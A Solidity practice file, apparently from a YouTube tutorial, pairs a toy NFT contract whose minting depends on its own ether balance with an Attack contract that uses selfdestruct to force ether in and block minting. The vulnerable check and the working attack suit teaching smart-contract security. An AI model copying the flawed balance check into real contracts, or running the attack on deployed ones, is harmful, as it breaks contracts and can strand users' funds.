// This was a guided practice via Dapp University Youtube channel. Video link: https://youtu.be/vcd6AoTf6Wk
// This practice allows the attacker to prevent the NFT contract from minting, even if the goal isnt yet reached, making the NFT contract futile.
// This is done using selfdestruct.

pragma solidity ^0.8.7;

import "hardhat/console.sol";

// Pseudo NFT contract
contract NFT {
    uint public goal = 100 ether;
    uint public totalSupply;
    mapping(uint => address) public ownerOf;

    function mint() public payable {
        require(msg.value == 1 ether, "Must send exactly 1 Ether!");
        require(address(this).balance <= goal, "Minting is finished!");

        totalSupply ++;

        ownerOf[totalSupply] = msg.sender;
    }
}

contract Attack {
    NFT nft;

    constructor(NFT _nft) {
        nft = NFT(_nft);
    }

    function attack() public payable {
        address payable nftAddress = payable(address(nft));
        selfdestruct(nftAddress);
    }
}
